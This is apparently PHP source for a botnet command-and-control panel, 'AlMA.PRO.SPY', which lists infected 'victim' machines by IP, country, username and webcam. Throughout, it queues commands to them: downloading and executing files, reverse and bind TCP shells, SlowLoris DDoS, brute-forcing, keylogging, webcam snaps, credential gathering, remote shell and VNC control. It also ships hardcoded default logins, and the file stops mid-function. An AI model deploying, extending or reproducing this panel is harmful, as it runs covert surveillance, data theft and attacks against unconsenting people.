<?php
	//////////////////////////////////
	////////// MAIN ACTIVITY /////////
	//////////////////////////////////
	error_reporting(E_ERROR | E_WARNING | E_PARSE);
	if (file_exists('config.php')){require_once('config.php');} // Check if config.php file is there and require it.
	if (!isset($cookiename)){ // Check if $cookiename is not set.
		// Add $cookiename to config file.
		addsettings("	\$cookiename='aps_session'; // Cookie name for organizing active sessions [Default: aps_session].");
	}
	if (!isset($logins)){ // Check if $logins are not set.
		// Add $logins to config file.
		addsettings("	\$logins=array('almapro' => 'leader', '' => ''); // AlMA.PRO.SPY logins' details (user => pass) [Default: almapro => leader].");
		// Show login screen.
		showlogin("Logins' details were not found. They were set to default.<br>Login: almapro - Password: leader");
	}
	$user_agent=$_SERVER['HTTP_USER_AGENT']; // Browser's UserAgent.
	if ($useragent!=''){ // Check if the UserAgent is set.
		if($user_agent!=$useragent){ // Check if the UserAgent is equal to the allowed one.
			die(); // Die as if you were never alive :(.
		}
	}
	if ($_SERVER['REQUEST_METHOD'] == 'POST'){
		if (!isset($_POST['do'])) {die();} // If there's nothing to do, then die.
		switch ($_POST['do']) {
			case 'login':
				if (isset($_POST['user']) && $_POST['user'] != '') {
					if (isset($_POST['pass']) && $_POST['pass'] != '') {
						if (checklogins($_POST['user'],$_POST['pass'])){
							$cookieval=getrnd(); // Login is correct completely, so generate a cookie to organize this session.
							$cookietimeout+=time(); // Add the current time to the cookie timeout.
							setcookie($cookiename,$cookieval,$cookietimeout,"/"); // Send the cookie to the browser.
							savesession($_POST['user'],$cookieval,$cookietimeout); // Save session in config.php file.
						}
					}else{die('Password cannot be skipped!');}
				}else{die('User was not given or empty!');}
				die(''); // Login setup is done, time to die.
				break;
			case 'logout':
				if (isset($_COOKIE[$cookiename])){
					$cv=$_COOKIE[$cookiename]; // Storing the cookie before erasing to use when deleting the session.
					setcookie($cookiename,null,-1,'/'); // Erasing the cookie to be unrecognized.
					deletesession($cv); // Deleting session from settings.
				}
				die(''); // Logout process is over, time to die.
				break;
			default:
				if($loginneed){if (!isset($_COOKIE[$cookiename]) || !checksession($_COOKIE[$cookiename])){die("reload");}}
				switch ($_POST['do']){
					case 'bots':
						$dbcon = connectdb(); if ($dbcon === false){die();}
						$sort = '1';
						if (isset($_POST['sort'])){if ($_POST['sort']=='0'){$sort='0';}elseif($_POST['sort']=='2'){$sort='2';}}
						$sqlq = 'SELECT * FROM `bots`';
						$botstate = ($sort=="0") ? " WHERE active='0'" : '';
						$botstate = ($sort=="1") ? " WHERE active='1'" : $botstate;
						$sqlq.=$botstate;
						$q=$dbcon->query($sqlq);if($q === false){
							$q=$dbcon->query("CREATE TABLE IF NOT EXISTS bots ( ".
								"botid VARCHAR(255), ".
								"botname VARCHAR(255), ".
								"username VARCHAR(255), ".
								"devicename VARCHAR(255), ".
								"os VARCHAR(255), ".
								"ip VARCHAR(255), ".
								"country VARCHAR(255), ".
								"version VARCHAR(255), ".
								"webcam VARCHAR(255), ".
								"active int(1), ".
								"lastseen VARCHAR(255), ".
								"cmd VARCHAR(255), ".
								"folder VARCHAR(255))");if($q === false){die("Error creating bots' table. Error ==> ".$dbcon->error);}else{
								$q=$dbcon->query("ALTER TABLE `bots` ADD PRIMARY KEY (`botid`);");$q=$dbcon->query("CREATE TABLE IF NOT EXISTS  statics (country VARCHAR(255),antivirus VARCHAR(255),status int(1),id VARCHAR(255))");
								die("bots' table was not found, so we founded it.<br><a href='' style='color: white;'>Click here to reload the page</a>");
							}
						}else{
							if($botsc=$dbcon->query("SELECT lastseen,botid FROM `bots` WHERE active='1'")){
								while ($botc = $botsc->fetch_assoc()){
									if(($botc['lastseen']+300) <= time()){
										$dbcon->query("UPDATE bots SET active='0' WHERE botid='".$botc['botid']."'");
										$q = $dbcon->query("SELECT * FROM statics WHERE id='".$botc['botid']."'");
										if($q->num_rows==0){
											$dbcon->query("INSERT INTO statics VALUES('Unknown','Unknown',0,'".$botc['botid']."')");
										}else{
											$dbcon->query("UPDATE statics SET status='0' WHERE id='".$botc['botid']."'");
										}
									}else{
										$q = $dbcon->query("SELECT * FROM statics WHERE id='".$botc['botid']."'");
										if($q->num_rows==0){
											$dbcon->query("INSERT INTO statics VALUES('Unknown','Unknown',1,'".$botc['botid']."')");
										}else{
											$dbcon->query("UPDATE statics SET status='1' WHERE id='".$botc['botid']."'");
										}
									}
									if(($botc['lastseen']+(86400 * 3)) <= time()){
										$q = $dbcon->query("SELECT * FROM statics WHERE id='".$botc['botid']."'");
										if($q->num_rows==0){
											$dbcon->query("INSERT INTO statics VALUES('Unknown','Unknown',2,'".$botc['botid']."')");
										}else{
											$dbcon->query("UPDATE statics SET status='2' WHERE id='".$botc['botid']."'");
										}
									}
								}
							}
						}
						$q=$dbcon->query($sqlq);
						if($q===false){die();}
						echo $q->num_rows."|";
						while ($row = $q->fetch_assoc()){
							echo "<div id='".$row['botid']."' class='bots-div'>";
							echo "<ul>";
							echo "<li><input class='input' type='checkbox' /></li>";
							echo "<li><b>".$row['botid']."</b></li>";
							echo "<li><b>".$row['botname']."</b></li>";
							echo "<li><b>".$row['username']."</b></li>";
							echo "<li><b>".$row['devicename']."</b></li>";
							echo "<li><b>".$row['os']."</b></li>";
							echo "<li><b>".$row['ip']."</b></li>";
							echo "<li><b>".$row['country']."</b></li>";
							echo "<li><b>".$row['version']."</b></li>";
							echo "<li><b>".$row['webcam']."</b></li>";
							echo "</ul>";
							echo "</div>";
							echo "|";
						}
						break;
					case 'search':
						$dbcon = connectdb(); if ($dbcon === false){die();}
						$sqlq = 'SELECT botid,botname,username,devicename,os,ip,country,version,webcam FROM `bots`';
						$botstate='';
						if (isset($_POST['ss'])){
							$botstate = ($_POST['ss']=='0') ? " WHERE active='0'" : '';
							$botstate = ($_POST['ss']=='1') ? " WHERE active='1'" : $botstate;
						}
						$sqlq.=$botstate;
						$country='';
						if(isset($_POST['sc'])){
							$country="%".$_POST['sc']."%";
							if($botstate==''){
								$sqlq.=' WHERE country LIKE ?';
							}else{
								$sqlq.=' AND country LIKE ?';
							}
						}
						$os_s='';
						if(isset($_POST['so'])){
							$os_s="%".$_POST['so']."%";
							if($botstate=='' and $country==''){
								$sqlq.=' WHERE os LIKE ?';
							}else{
								$sqlq.=' AND os LIKE ?';
							}
						}
						$rcon=$dbcon->prepare($sqlq);
						if($rcon!==false){
							if($country!='' and $os_s!=''){
								$rcon->bind_param("ss",$country,$os_s);
							}elseif($country!='' and $os_s==''){
								$rcon->bind_param("s",$country);
							}elseif($country=='' and $os_s!=''){
								$rcon->bind_param("s",$os_s);
							}
							if($rcon->execute()===false){die("Error searching amoung bots. Error ==> ".$dbcon->error);}else{$rcon->store_result();$q=true;}
						}
						if($q === false){
							$q=$dbcon->query("CREATE TABLE IF NOT EXISTS bots ( ".
								"botid VARCHAR(255), ".
								"botname VARCHAR(255), ".
								"username VARCHAR(255), ".
								"devicename VARCHAR(255), ".
								"os VARCHAR(255), ".
								"ip VARCHAR(255), ".
								"country VARCHAR(255), ".
								"version VARCHAR(255), ".
								"webcam VARCHAR(255), ".
								"active int(1), ".
								"lastseen VARCHAR(255), ".
								"cmd VARCHAR(255), ".
								"folder VARCHAR(255))");if($q === false){die("Error creating bots' table. Error ==> ".$dbcon->error);}else{
								$q=$dbcon->query("ALTER TABLE `bots` ADD PRIMARY KEY (`botid`);");$q=$dbcon->query("CREATE TABLE IF NOT EXISTS  statics (country VARCHAR(255),antivirus VARCHAR(255),status int(1),id VARCHAR(255))");
								die("bots' table was not found, so we founded it.<br><a href='' style='color: white;'>Click here to reload the page</a>");
							}
						}else{
							if($botsc=$dbcon->query("SELECT lastseen,botid FROM `bots` WHERE active='1'")){
								while ($botc = $botsc->fetch_assoc()){
									if(($botc['lastseen']+300) <= time()){
										$dbcon->query("UPDATE bots SET active='0' WHERE botid='".$botc['botid']."'");
										$q = $dbcon->query("SELECT * FROM statics WHERE id='".$botc['botid']."'");
										if($q->num_rows==0){
											$dbcon->query("INSERT INTO statics VALUES('".$botc['botid']."','Unknown','Unknown',0");
										}else{
											$dbcon->query("UPDATE statics SET status='0' WHERE id='".$botc['botid']."'");
										}
									}else{
										$q = $dbcon->query("SELECT * FROM statics WHERE id='".$botc['botid']."'");
										if($q->num_rows==0){
											$dbcon->query("INSERT INTO statics VALUES('".$botc['botid']."','Unknown','Unknown',1");
										}else{
											$dbcon->query("UPDATE statics SET status='1' WHERE id='".$botc['botid']."'");
										}
									}
									if(($botc['lastseen']+(86400 * 3)) <= time()){
										$q = $dbcon->query("SELECT * FROM statics WHERE id='".$botc['botid']."'");
										if($q->num_rows==0){
											$dbcon->query("INSERT INTO statics VALUES('".$botc['botid']."','Unknown','Unknown',2");
										}else{
											$dbcon->query("UPDATE statics SET status='2' WHERE id='".$botc['botid']."'");
										}
									}
								}
							}
						}
						if(!$rcon->execute()){die();}
						$rcon->store_result();
						if($rcon->affected_rows==0){die();}
						$bi='';$bn='';$un='';$dn='';$os='';$ip='';$c='';$v='';$w='';
						$rcon->bind_result($bi,$bn,$un,$dn,$os,$ip,$c,$v,$w);
						echo $rcon->affected_rows."|";
						while ($rcon->fetch()){
							echo "<div botid='".$bi."' style='list-style-type: none;float: none;text-align: center;'>";
							echo "<ul>";
							echo "<li><p>".$bi."</p></li>";
							echo "<li><p>".$bn."</p></li>";
							echo "<li><p>".$un."</p></li>";
							echo "<li><p>".$dn."</p></li>";
							echo "<li><p>".$os."</p></li>";
							echo "<li><p>".$ip."</p></li>";
							echo "<li><p>".$c."</p></li>";
							echo "<li><p>".$v."</p></li>";
							echo "<li><p>".$w."</p></li>";
							echo "</ul>";
							echo "</div>";
							echo "|";
						}
						break;
					case 'settings':
						$dbcon = connectdb(); if ($dbcon === false){die();}
						?>
						<table class='table'>
							<tr>
								<th num='1'><a class='tab' title="Bots' settings">Bots</a></th>
								<th num='2'><a class='tab' title="Access' settings">Access</a></th>
								<th num='3'><a class='tab' title="Sessions' settings">Sessions</a></th>
								<th num='4'><a class='tab' title="Database's settings">Database</a></th>
								<th num='5'><a class='tab' title="CPanel's settings">CPanel</a></th>
								<th num='6'><a class='tab' title="Statics">Statics</a></th>
							</tr>
						</table>
						<div class='tab-bots search'>
							<table>
								<tr>
									<th num='6'><a class="tab" onclick="document.getElementsByClassName('tab-bots')[0].className='tab-bots search';" title="Search among bots">Search</a></th>
									<th num='7'><a class="tab" onclick="document.getElementsByClassName('tab-bots')[0].className='tab-bots commands';" title="Give commands to the bots">Commands</a></th>
								</tr>
							</table>
							<div class="tab-search">
								<ul>
									<li style="float: none;"><b>Total bots: <?php $q = $dbcon->query("SELECT * FROM `bots`"); echo $q->num_rows; ?> - </b><b>Search: </b><b><select title="Status to search by" id='s-s' style="color: white;background: black;font-size: 20px;">
										<option value='' selected="">All bots</option>
										<option value="1">Online bots</option>
										<option value="0">Offline bots</option>
									</select></b><b><select title="Country to search by" id="s-c" style="color: white;background: black;font-size: 20px;">
										<option  value='' selected="">Select a country</option>
										<?php
											$q=$dbcon->query("SELECT country FROM `bots`");
											if($q===false){die();}
											while ($row = $q->fetch_assoc()){
												echo "<option value=\"".$row['country']."\">".$row['country']."</option>";
											}
										?>
									</select></b><b><select title="OS to search by" id="s-o" style="color: white;background: black;font-size: 20px;">
										<option value='' selected="">Any OS</option>
										<option value='android'>Android</option>
										<option value="ios">IOS</option>
										<option value="linux">Linux</option>
										<option value="mac">Mac OS X</option>
										<option value="windows">Windows</option>
									</select></b><b><button style="color: white;background: black;font-size: 20px;" onclick="doSearch();">Search</button> </b><b id='sbc'>Total found: 0</b></li>
								</ul>
								<div class="sbv">
									<div this='yes' style='height: 8%;left: 15%;'>
										<ul>
											<li><p>Bot ID</p></li>
											<li><p>Bot Name</p></li>
											<li><p>User Name</p></li>
											<li><p>Device Name</p></li>
											<li><p>OS</p></li>
											<li><p>IP</p></li>
											<li><p>Country</p></li>
											<li><p>Version</p></li>
											<li><p>Webcam</p></li>
										</ul>
									</div>
									<div id='sv' style="overflow-y: auto;height: 90%;"></div>
								</div>
							</div>
							<div class="tab-commands">
								<ul>
									<li style="float: none;">
										<b>Send 1 command, all bots receive.</b><BR><BR><BR>
										<input type="button" class="ccc-btn" onclick="botsccc('df');" value="Download a file" title="Download a file">
										<input type="button" class="ccc-btn" onclick="botsccc('x');" value="Execute a file" title="Execute a file">
										<input type="button" class="ccc-btn" onclick="botsccc('x -cmd');" value="Execute a file in cmd" title="Execute a file in cmd"><BR><BR>
										<input type="button" class="ccc-btn" onclick="botsccc('update');" value="Update" title="Update all found bots from URL">
										<input type="button" class="ccc-btn" onclick="botsccc('btcp');" value="Bind TCP" title="Try to bind a TCP port">
										<input type="button" class="ccc-btn" onclick="botsccc('rtcp');" value="Reverse TCP" title="Connect to a Host/IP on a specific port"><BR><BR>
										<input type="button" class="ccc-btn" onclick="botsccc('sl');" value="SlowLoris DDoS" title="Attack a Host/IP with SlowLoris DDoS Attack">
										<input type="button" class="ccc-btn" onclick="botsccc('co');" value="CrackOff" title="Run CrackOff bruteforce on a Online service"><BR><BR>
										Write a command: <input type="text" class="input" title="Write a command with your hands (Careful what you wish for)" onkeyup="if(event.which == 13 || event.KeyCode == 13){botsccc(this.value);this.value='';}"><BR><BR>
										<input type="button" class="input" style="color: red;cursor: pointer;" value="Delete bots!" title="Careful with this one !_!" onclick="botsccc('gb')">
									</li>
								</ul>
							</div>
						</div>
						<div class='tab-access'>
							<ul>
								<li><b>UserAgent: </b><br><input type='text' class='input' title='UserAgent' value='<?php echo "$useragent"; ?>'/></li>
								<li><b>Cookie Name: </b><br><input type='text' class='input' title='Cookie Name' value='<?php echo "$cookiename"; ?>'/></li>
								<li><b>Cookie Timeout: </b><br><input type='text' class='input' title='Cookie Timeout' value='<?php echo $cookietimeout; ?>'/></li>
								<br>
							</ul>
							<ul>
								<li><b>Logins Edit: </b><br><select class='input' id='logins'>
																		<?php foreach ($logins as $key => $value) {
																			if($key!='') echo "<option value='$key - $value'>$key - $value</option>"."\r\n";
																		} ?>
																		<option value=' - '> - </option>
																	</select></li>
								<li><b>Username Edit: </b><br><input type='text' class='input' title='Username Edit' id='useredit'/></li>
								<li><b>Password Edit: </b><br><input type='text' class='input' title='Password Edit' id='passedit'/></li>
							</ul>
							<ul>
								<li><b>Login Needed: </b><br><input type='checkbox' class='input' title='Login Needed' <?php echo ($loginneed) ? 'checked=""' : '' ; ?>/></li>
								<li><button class="progress-button" title="Submit changes of logins" id='submit-logins'>
										<span class="content">Submit changes</span>
										<span class="progress">
										<span class="progress-inner"></span>
									</span>
								</button></li>
							</ul>
						</div>
						<div class='tab-sessions'>
							<ul>
								<li style='width:5%;'><b>Selected</b></li>
								<li style='width:15%;'><b>Login User</b></li>
								<li style='width:38%;'><b>Session cookie</b></li>
								<li style='width:17%;'><b>Session timeout</b></li>
								<li style='width:15%;'><b>Operation System</b></li>
								<li style='width:10%;'><b>Browser</b></li>
								<br>
							</ul>
							<div style='overflow-y: auto;height: 85%;'>
								<?php
									$handle = fopen("config.php", "r");
									while (($line = fgets($handle)) !== false) {
									    if (strpos($line,"|")!==false){
									    	$settings=explode("|", $line);
										    $settings[0] = str_replace('	//', '', $settings[0]);
										    echo "<ul>";
											echo "<li style='width:5%;'><input type='checkbox' class='chkbx' session='$settings[1]' /></li>"."\r\n";
											echo "<li style='width:15%;'><b>$settings[0]</b></li>"."\r\n";
											echo "<li style='width:38%;'><b>$settings[1]</b></li>"."\r\n";
											echo "<li style='width:17%;'><b>".date("Y-m-d h:i:s",$settings[2])."</b></li>"."\r\n";
											echo "<li style='width:15%;'><b>$settings[3]</b></li>"."\r\n";
											echo "<li style='width:10%;'><b>$settings[4]</b></li>"."\r\n";
											echo "</ul>"."\r\n";
										}
									}
									fclose($handle);
								?>
							</div>
							<div style='height: 10%;'>
								<button style='width: 100%;color: white;background: black;' title='Delete selected sessions' id='dlt-session'>Delete</button>
							</div>
						</div>
						<div class='tab-database'>
							<ul>
								<li><b>Database Name: </b><br><input type='text' class='input' value='<?php echo "$dbname"; ?>' title='Database Name'/></li>
								<li><b>Database Host: </b><br><input type='text' class='input' value='<?php echo "$dbhost"; ?>' title='Database Host'/></li>
							</ul>
							<ul>
								<li><b>Database Username: </b><br><input type='text' class='input' value='<?php echo "$dbuser"; ?>' title='Database Username'/></li>
								<li><b>Database Password: </b><br><input type='text' class='input' value='<?php echo "$dbpass"; ?>' title='Database Password'/></li>
							</ul>
						</div>
						<div class='tab-cpanel'>
							<ul>
								<li style="float: none;">
									<b>Upload</b><BR><BR>
									<b><form target="_BLANK" method="post" action="extras/upload.php" enctype="multipart/form-data"><input  style="color: white;background: black;font-size: 20px;" type="file" id="file" name="file" /> File name: <input type="text"  style="color: white;background: black;font-size: 20px;" name="fileinfo" id="fileinfo" title="File's name after upload. Leave empty to use default (original file name)." /> <input type="submit"  style="color: white;background: black;font-size: 20px;" name="done" value="Upload" onclick="setTimeout(function(){document.getElementById('file').value='';document.getElementById('fileinfo').value='';},1000);" /></form></b>
								</li>
							</ul>
						</div>
						<div class='tab-statics'>
							<?php
								$real_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
								$real_url = str_replace(substr(strrchr($real_url,"/"),1),"",$real_url)."statics.php";
								echo file_get_contents($real_url);
							?>
						</div>
						<?php
						break;
					case 'menu':
						?>
						<div class='menu-item' title='Change wait time'>Change wait time</div>
						<div class='menu-item' title='Take a webcam snap'>Send a Webcam snap (If Available)</div>
						<div class='menu-item' title='Gather logins'>Send Logins</div>
						<div class='menu-item' title="What's idle time?">Send Idle Time</div>
						<div class='menu-item' title='Enable Keyslogger'>Enable Keyslogger (If Available)</div>
						<div class='menu-item' title='Disable Keyslogger'>Disable Keyslogger</div>
						<div class='menu-item' title='Send all logs'>Send all logs</div>
						<div class='menu-item' title='Get Higher'>Get Higher</div>
						<?php
						break;
					case 'delete':
						if(!deletesession($_POST['session'])){die('Error');};
						break;
					case 'update':
						if (isset($_POST['setting'])){
							if (isset($_POST['value'])){
								if ($_POST['setting']=='cookiename'){
									$cv=$_COOKIE[$cookiename]; // Storing the cookie before erasing to use when deleting the session.
									setcookie($cookiename,null,-1,'/'); // Erasing the cookie to be unrecognized.
									setcookie($_POST['value'],$cv,getsessiontimeout($cv),'/');
								}
								$login=false;
								$password=false;
								if (isset($_POST['login'])){$login=true;}
								if (isset($_POST['password'])){$password=true;}
								editsettings($_POST['setting'],$_POST['value'],$login,$password);
							}
						}
						break;
					case 'logins':
						foreach ($logins as $key => $value) {
								if($key!='') echo "<option value='$key - $value'>$key - $value</option>"."\r\n";
						} ?>
						<option value=' - '> - </option>
						<?php
						break;
					case 'cmd':
						if (isset($_POST['botid'])){
							if (isset($_POST['cmd'])){
								$dbcon = connectdb(); if ($dbcon === false){die('Could not connect to the database.');}
								$rcon = $dbcon->prepare("SELECT cmd FROM bots WHERE botid = ?");
								$fcmd=addslashes($_POST['cmd']);
								$rcon->bind_param("s",$_POST['botid']);
								$rcon->execute();
								$rcon->store_result();
								if ($rcon->affected_rows==1){
																		$cmd='';
																		$rcon->bind_result($cmd);
                                    if($rcon->fetch()){
                                        if(strpos($cmd,$fcmd.";") !== false){die('Command is already waiting to be done.');}
                                    }
                                }
								$rcon = $dbcon->prepare("SELECT cmd FROM bots WHERE botid = ?");
								$rcon->bind_param("s",$_POST['botid']);
								$rcon->execute();
								$rcon->store_result();
								if ($rcon->affected_rows==0){
									$rcon = $dbcon->prepare("INSERT INTO bots VALUES(?,'Unknown','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown',0,'Never Been Seen',?;,?)");if($rcon===false){
										die("Error Sending command to the bot. Error ==> ".$dbcon->error);}else{
                                            $fcmd=addslashes($_POST['cmd']).";";
											$rcon->bind_param("sss",$_POST['botid'],$fcmd,"sessions/".getrnd(20)."/");
											if($rcon->execute()===false){
												die("Error Sending command to the bot. Error ==> ".$dbcon->error);
											}
										}
								}else{
									$cmd="";
									$rcon->bind_result($cmd);
									if($rcon->fetch()){
										$rcon=$dbcon->prepare("UPDATE bots SET cmd=? WHERE botid = ?");if($rcon===false){
											die("Error Sending command to the bot. Error ==> ".$dbcon->error);}else{
												$fcmd=$cmd.addslashes($_POST['cmd']).";";
												$rcon->bind_param("ss",$fcmd,$_POST['botid']);
												if($rcon->execute()===false){
													die("Error Sending command to the bot. Error ==> ".$dbcon->error);
												}
											}
									}
								}
							}
						}
						break;
					case 'bot':
						if (isset($_POST['botid'])){
							$dbcon = connectdb(); if ($dbcon === false){die('Could not connect to the database.');}
							$rcon = $dbcon->prepare("SELECT botid,botname,folder,lastseen,os,username,devicename,webcam,version,ip,country FROM bots WHERE botid = ?");if($rcon===false){
								die("Error ==> ".$dbcon->error);}else{
									$rcon->bind_param("s",$_POST['botid']);
									if($rcon->execute()===false){die('Either bot ID is not correct or the bot was deleted.');}else{$botcmd=$rcon->store_result();}
								}
							$bot[11];
							$rcon->bind_result($bot['botid'],$bot['botname'],$bot['folder'],$bot['lastseen'],$bot['os'],$bot['username'],$bot['devicename'],$bot['webcam'],$bot['version'],$bot['ip'],$bot['country']);
							if($rcon->fetch()){
								?>
								<div id='bot-title' bot="<?php echo $bot['botid']; ?>" class='title'><?php echo $bot['botid'].' - '.$bot['botname']; ?></div>
								<div class='img-viewer'>
									<select class='input' id='img-type' style='width: 80%;margin-left: 10%;margin-top: 1%;text-align: center;'>
										<option selected='' value='dss'>Desktop Screen-Shot</option>
										<option value='wcs'>Webcam Snap</option>
									</select>
									<button class='nav-button' title='Next'><</button>
									<img src='imgs/background.php' class='image-viewer' folder='<?php echo $bot['folder']; ?>'/>
									<button class='nav-button' title='Previous'>></button>
								</div>
								<div class='bot-controller'>
									<BR>
									<style>.bots-d{overflow-x: auto;width:90%;white-space: nowrap;margin-left: 5%;}</style>
									<div title="Folder of the bot's content" class='bots-d'>Bot's Folder: <a style='width: 50%;' target='_BLANK' href='<?php echo $bot['folder']; ?>/index.php'><?php echo $bot['folder']; ?></a></div>
									<div class='bots-d' title="Last seen time">Last Seen: <?php echo date("Y-m-d h:i:s A - e P",(float) $bot['lastseen']); ?></div>
									<div class='bots-d' title="Operation System of the victim's device">OS: <?php echo $bot['os']; ?></div>
									<div class='bots-d' title="Username of the victim">User Name: <?php echo $bot['username']; ?></div>
									<div class='bots-d' title="Device Name of the victim">Device Name: <?php echo $bot['devicename']; ?></div>
									<div class='bots-d' title="Does the victim has a Webcam?">Webcam: <?php echo $bot['webcam']; ?></div>
									<div class='bots-d' title="Version and type of the bot">Version: <?php echo $bot['version']; ?></div>
									<div class='bots-d' title="The last bot's IP">IP: <?php echo $bot['ip']; ?></div>
									<div class='bots-d' title="Country of the victim">Country: <?php echo $bot['country']; ?></div>
									<BR>
									<div style='box-shadow: 0px 0px 3px 0px white;width: 100%;'>
										<div style='text-align: center;height: 5%;' title='Live Control'>Live Control</div>
										<div id='livecontrol' style='width: 99%;'></div>
									</div>
								</div>
								<?php
							}
						}
						break;
					case 'livecontrol':
						if (isset($_POST['botid'])){
							$dbcon = connectdb(); if ($dbcon === false){die('Could not connect to the database.');}
							$rcon = $dbcon->prepare("SELECT active FROM bots WHERE botid = ?");if($rcon===false){
								die("Error ==> ".$dbcon->error);}else{
									$rcon->bind_param("s",$_POST['botid']);
									if($rcon->execute()==false){die('Either bot ID is not correct or the bot was deleted.');}else{$botcmd=$rcon->store_result();}
								}
							$bot='';
							$rcon->bind_result($bot);
							if($rcon->fetch()){
								if($bot == 0){
									?>
									<BR>
									<div style='color: red;top:50%;height:100%;text-align: center;cursor: not-allowed;' title='The bot is Offline.'>Live control is not available.<BR>Due to the bot being Offline, the live control cannot be done.<BR>You need to wait for the bot to be back Online, then, and only then you can use live control.<BR>The Live Control is automatically updated, which means once the bot is Online again, you'll have access to the Live Control.
									</div><p style='color: white;text-align:left;left: 50%;'>Best regards, index.php file.</p>
									<BR>
									<?php
								}else{
									?>
									<center>
										<table class='livecontrol-table rcmd'>
											<tr>
												<th num='1'><a title='Remote Shell'>Remote Shell</a></th>
												<th num='2'><a title='File Manager'>File manager</a></th>
												<th num='3'><a title='VNC Control'>VNC</a></th>
												<th num='4'><a title='Commands Control Center'>CCC</a></th>
											</tr>
										</table>
										<div id="lcd" class="lcd rcmd">
											<div style='width: 98%;height: 220px;' id='rcmd'>
												<input class="lci" type='text' id='rcmdline' />
												<textarea id='rcmdlines' class="lci" style='margin-top:1%;text-align:left;' readonly></textarea>
											</div>
											<div style='width: 98%;height: 220px;' id='fm'>
												<div>
													<input type="button" onclick='fman("uf")' class="fman-btn" value="Upload" title="Upload a file" />
													<input type="button" onclick='fman("touch")' class="fman-btn" value="Make a file" title="Make a new file" />
													<input type="button" onclick='fman("mkdir")' class="fman-btn" value="Make a dir" title="Make a new directory" />
													<input type="button" onclick='fman("ref")' class="fman-btn" value="Refresh" title="Refresh current path" />
												</div>
												<div id='fman-p' style="overflow-y: auto; white-space: nowrap;"></div>
												<div id="fman-v" style="overflow-x: auto;height: 155px;"></div>
											</div>
											<div style='width: 98%;height: 220px;' id='vnc'>
												<BR><BR><BR>
												<div>
													Use mouse:    <input type="checkbox" title='Interact with your mouse' id="vncm"/>
													Use keyboard: <input type="checkbox" title='Interact with your keyboard' id="vnck"/>
												</div><BR>
												<button class="input" onclick="startvnc('<?php echo $_POST['botid'];?>');">Start</button>
											</div>
											<div style='width: 98%;height: 220px;' id='ccc'>
												<BR>
												<input type="button" class="ccc-btn" onclick="ccc('df');" value="Download a file" title="Download a file">
												<input type="button" class="ccc-btn" onclick="ccc('x');" value="Execute a file" title="Execute a file">
												<input type="button" class="ccc-btn" onclick="ccc('x -cmd');" value="Execute a file in cmd" title="Execute a file in cmd"><BR>
												<input type="button" class="ccc-btn" onclick="ccc('update');" value="Update" title="Update the bot from URL">
												<input type="button" class="ccc-btn" onclick="ccc('btcp');" value="Bind TCP" title="Try to bind a TCP port">
												<input type="button" class="ccc-btn" onclick="ccc('rtcp');" value="Reverse TCP" title="Connect to a Host/IP on a specific port"><BR><BR>
												<input type="button" class="ccc-btn" onclick="ccc('sl');" value="SlowLoris DDoS" title="Attack a Host/IP with SlowLoris DDoS Attack">
												<input type="button" class="ccc-btn" onclick="ccc('co');" value="CrackOff" title="Run CrackOff bruteforce on a Online service"><BR>
												Write a command: <input type="text" class="input" title="Write a command with your hands (Careful what you wish for)" onkeyup="if(event.which == 13 || event.KeyCode == 13){ccc(this.value);this.value='';}"><BR><BR>
												<input type="button" class="input" style="color: red;cursor: pointer;" value="Delete bot!" title="Careful with this one !_!" onclick="ccc('gb')">
											</div>
										</div>
									</center>
									<?php
								}
							}
						}
						break;
					case "log":
						if (isset($_POST['botid'])){
							if(!isset($_POST['type'])){die("Error|No log type was given.");}
							$dbcon = connectdb(); if ($dbcon === false){die('Error|Could not connect to the database.');}
							$rcon = $dbcon->prepare("SELECT folder FROM bots WHERE botid = ?");if($rcon===false){
								die("Error ==> ".$dbcon->error);}else{
									$rcon->bind_param("s",$_POST['botid']);
									if($rcon->execute()==false){die('Either bot ID is not correct or the bot was deleted.');}else{$botcmd=$rcon->store_result();}
								}
							$bot='';
							$rcon->bind_result($bot);
							if($rcon->fetch()){
								if(file_exists($bot.'/logs/'.$_POST['type'].'.log')){die(file_get_contents($bot.'/logs/'.$_POST['type'].'.log'));}
							}
						}
						break;
					case 'fman':
						if (isset($_POST['botid'])){
							$dbcon = connectdb(); if ($dbcon === false){die('Error|Could not connect to the database.');}
							$rcon=$dbcon->prepare("SELECT folder FROM bots WHERE botid = ?");if($rcon===false){
								die("Error ==> ".$dbcon->error);}else{
									$rcon->bind_param("s",$_POST['botid']);
									if($rcon->execute()==false){die('Either bot ID is not correct or the bot was deleted.');}else{$botcmd=$rcon->store_result();}
								}
							$bot='';
							$rcon->bind_result($bot);
							if($rcon->fetch()){
								if(file_exists($bot.'/fman-ref.txt')){
									$d = file_get_contents($bot['folder'].'/fman-ref.txt');
									if(preg_match('/|/', $d)){
										if(preg_match('/|||/', $d)){
											$da = explode('|||', $d);
											if(preg_match('/\\\/', $da[0])){
												$pa = explode('\\', $da[0]);
												$pn = ".";
												foreach($pa as $pp){
													$pn .= "\\\..";
													echo "<a onclick='fman(\"cd $pn\")'>$pp</a>\\";
												}
											}elseif(preg_match('/\//', $da[0])){
												$pa = explode('/', $da[0]);
												$pn = ".";
												foreach($pa as $pp){
													$pn .= "/..";
													echo "<a onclick='fman(\"cd $pn\")'>$pp</a>/";
												}
											}
											echo "|";
											$fsa = explode('||', $da[1]);
											foreach($fsa as $f){
												$fa = explode("|", $f);
												if(endsWith($fa[1],'Directory')){
													echo "<div class='fman-view' oncontextmenu=\"fmanmenu('d $fa[0]');return false;\" onclick=\"fman('cd $fa[0]')\">";
													echo "<ul>";
													echo "<li><a onclick='fman(\"cd $fa[0]\")'>$fa[0]</a></li>";
													echo "<li><div>$fa[1]</div></li>";
													echo "</ul>";
													echo "</div>";
												}elseif(endsWith($fa[1],'File')){
													echo "<div class='fman-view' oncontextmenu=\"fmanmenu('f $fa[0]');return false;\">";
													echo "<ul>";
													echo "<li><a>$fa[0]</a></li>";
													echo "<li><div>$fa[1]</div></li>";
													echo "</ul>";
													echo "</div>";
												}
											}
										}else{
											$da = explode('|', $d);
											if(preg_match('/\\/', $da[0])){
												$pa = explode('\\', $da[0]);
												$pn = ".";
												foreach($pa as $pp){
													$pn .= "\\\..";
													echo "<a onclick='fman(\"cd $pn\")'>$pp</a>\\";
												}
											}elseif(preg_match('/\//', $da[0])){
												$pa = explode('/', $da[0]);
												$pn = ".";
												foreach($pa as $pp){
													$pn .= "/..";
													echo "<a onclick='fman(\"cd $pn\")'>$pp</a>/";
												}
											}
											echo "|";
										}
									}
								}
